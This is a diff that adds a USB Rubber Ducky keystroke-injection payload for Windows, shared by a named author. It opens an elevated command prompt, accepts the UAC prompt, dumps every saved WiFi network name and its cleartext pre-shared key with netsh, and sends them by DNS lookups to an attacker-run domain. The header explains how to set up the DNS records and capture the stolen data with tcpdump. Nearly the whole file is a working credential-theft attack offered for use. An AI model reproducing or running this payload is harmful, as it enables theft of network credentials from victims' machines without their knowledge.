@@ -1,0 +1,48 @@
+# Title:         DNS Exfiltrate WiFi names and preshared key 
+# Description:   Exfiltrates WiFi names and PSK using DNS 
+# Author:        Keld Norman / Twitter: @keld_norman
+# Props:         Google, RTFM, weeks og trial and errors
+# Version:       1.0
+# Category:      WiFi Exfiltration
+# Target:        Windows (Shell Script) because Powershell is so noisy 
+# Attackmodes:   HID
+#
+# Options - DNS Server to exfiltrate to
+# Just replace "dns.yourdomain_where_you_have_a_dns_sniffer_and_NS_record_on.com" in the code with your DNS Server
+#
+# You have to alter your DNS (could be on Cloudflare) and add two records: an A record + a NS record.
+# The A-Record should point to a sub domain like DNS.yourdomain.xx
+# The NS-Record should point to DNS.yourdomain.xx
+# 
+# Then just run tcpdump on your linux host where the A-record points to and harvest the DNS data
+# tcpdump -i eth0 -s0 -A port 53
+#
+# Be aware that exfiltrated WiFi names and code will be send in clear text over the internet..
+# 
+# TODO: This only works for WiFi names without space in the name.
+#
+DUCKY_LANG US
+REM Target:  WINDOWS 
+REM Purpose: Exfiltrate all saved WiFi names + PSK via DNS 
+DELAY 3000 
+CONTROL ESCAPE
+DELAY 500 
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000 
+ALT Y
+DELAY 500
+ENTER
+DELAY 500
+STRING @echo off
+DELAY 500
+ENTER
+DELAY 500
+STRING for /f "tokens=3* delims=: " %a IN ('netsh wlan show profiles ^|findstr /c:"    " ^|findstr ":"') do for /f "tokens=3 delims=: " %c in ('netsh wlan sh pr "%b" key^=clear 2^>nul^|findstr /c:": "^|findstr "Key Content"') do ping -n 1 -w 1000 -4 %b.%c.dns.yourdomain_where_you_have_a_dns_sniffer_and_NS_record_on.com > nul
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 500
+ENTER
